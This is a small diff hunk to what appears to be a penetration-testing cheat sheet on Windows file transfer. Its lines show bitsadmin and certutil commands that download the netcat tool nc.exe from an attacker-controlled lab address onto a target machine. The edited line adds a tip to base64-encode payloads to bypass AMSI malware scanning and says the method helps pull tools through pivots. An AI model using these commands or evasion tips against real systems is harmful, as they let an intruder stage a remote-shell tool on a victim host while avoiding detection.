@@ -186,7 +186,7 @@ bitsadmin /transfer wcb /priority foreground http://10.10.10.32:8000/nc.exe C:\U
 
 ### CertUtil
 
-AMSI may flag this — consider base64 encoding to bypass.
+AMSI may flag this — consider base64 encoding to bypass. Useful for pulling tools through pivots.
 
 ```cmd
 certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe nc.exe
